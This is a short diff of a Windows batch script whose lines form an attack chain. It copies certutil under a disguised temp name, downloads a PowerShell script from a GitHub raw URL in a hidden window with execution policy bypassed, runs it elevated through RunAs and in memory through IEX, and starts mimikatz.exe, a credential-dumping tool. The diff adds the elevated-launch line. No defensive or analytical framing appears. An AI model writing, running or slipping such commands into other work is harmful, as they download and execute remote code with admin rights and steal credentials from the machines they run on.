@@ -2,8 +2,10 @@
 
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
+
 powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1','%Temp%\mark.ps1')"
 
+powershell.exe "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File %Temp%\mark.ps1' -Verb RunAs"
 
 powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 start %temp%\mimikatz.exe
